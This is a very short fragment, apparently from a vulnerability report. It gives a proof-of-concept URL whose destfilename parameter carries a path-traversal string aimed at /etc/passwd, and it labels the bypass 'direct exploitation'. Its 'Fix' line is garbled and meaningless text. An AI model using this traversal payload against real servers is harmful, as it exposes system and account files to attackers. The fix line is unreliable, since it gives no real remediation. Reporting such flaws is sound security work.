**POC**: https://example.com/[redacted]).pdf&destfilename=../../../../../../../../etc/passwd

**Bypass**: Direct exploitation

**Fix**: nottextItext Itextalltextlook atto
---
